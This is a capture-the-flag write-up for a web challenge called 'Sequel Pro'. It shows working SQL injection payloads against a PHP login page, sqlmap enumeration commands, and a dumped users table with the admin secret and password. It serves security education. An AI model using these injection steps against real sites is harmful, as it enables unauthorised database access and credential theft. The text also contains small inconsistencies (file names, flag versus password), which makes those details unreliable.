# Web Qualifiers: Sequel Pro
## Statement
> At Sequel Pro there is a vulnerable login page. You can login as ctf with password ctf. Can you find out the secret of admin?

Author: **@Mocanu Gabriel**

## Analysis

By reaching the url you arrive in a login page and when connecting using the initial creds shows up that we get a "non-secret".

I intercepted the login request using Burp-Suite and sent it to the repeater, to work on the parameters.

After tryng a few payload, we see that when trying sql-injection on the parameters, we obtain an error, which learns us about the database:
payload
`username=admin&password=' OR 1=1 --aa`
response
```
<html>
  <head>
    <title>login.php</title>
  </head>
  <body>
<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_array() on boolean in /var/www/html/login.php:23
Stack trace:
#0 {main}
  thrown in <b>/var/www/html/login.php</b> on line <b>23</b><br />
```

So the parameter password is injectable, now we can start working on the database to find the databases names, the tables names and the columns, and in the end we may try to find what is inside the columns to get any interesting informations.

What we are looking for are login parameters for the admin account.

To do so, I choose to use sqlmap, and I put the request intercepted with Burp-Suite in a .txt file:

login.txt
```
POST /login.php HTTP/1.1
Host: 141.85.224.116:8083
Content-Length: 53
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://141.85.224.116:8083
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://141.85.224.116:8083/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

username=username&password=password
```

This command gave me the following result: `python .\sqlmap.py -r .\login.txt`
```
sqlmap identified the following injection point(s) with a total of 108 HTTP(s) requests:
---
Parameter: password (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: username=admin&password=admin' UNION ALL SELECT NULL,NULL,CONCAT(0x716b717a71,0x57766e4f574e5a665a4b4d4f647a726f466b784864614e54736444724b574a675158494a72626658,0x716b6b6271)-- -

Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 1467 FROM (SELECT(SLEEP(5)))ChfG) AND 'TkQc'='TkQc&password=admin

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: username=-7597' UNION ALL SELECT NULL,NULL,CONCAT(0x716b717a71,0x474f674c674b49564e73597743637771435748577242514d705355786172767741536a6169794d5a,0x716b6b6271)-- -&password=admin
---
```

## Exploitation

We can start working on the exploit w/ this command: `python .\sqlmap.py -r .\login.txt --dbs`

```
available databases [6]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] users
[*] web_task_db
```

`python .\sqlmap.py -r .\qualifiers.txt -D users --tables` learns us that there is only one table in this db which is users

Then --dump gives us the table in itself: `python .\sqlmap.py -r .\qualifiers.txt -D users -T users --dump`

```
Table: users
[2 entries]
+--------+---------------------------+--------------+
| name   | secret                    | password     |
+--------+---------------------------+--------------+
| admin  | SSS{yummy_and_nutritious} | phahh7Gohpha |
| ctf    | this_is_not_a_secret      | ctf          |
+--------+---------------------------+--------------+
```

We found the flag which was the actual admin password.

Note: We could have proceed all these injections manualy by following this pattern
- Find the number of parameters of the query with UNION SELECT NULL and adding more or less NULL
- Find the databases names then table names using information_schema guessing with LIKE queries (WHERE schema_name LIKE 'a'... then LIKE 'ua'.. 'us'.. etc.)
- Do the same LIKE to find the columns of the users table
- Dump the data using LIKE queries
- Query the secret / connect with the admin credentials and get the secret on the website

Flag: **SSS{yummy_and_nutritious}**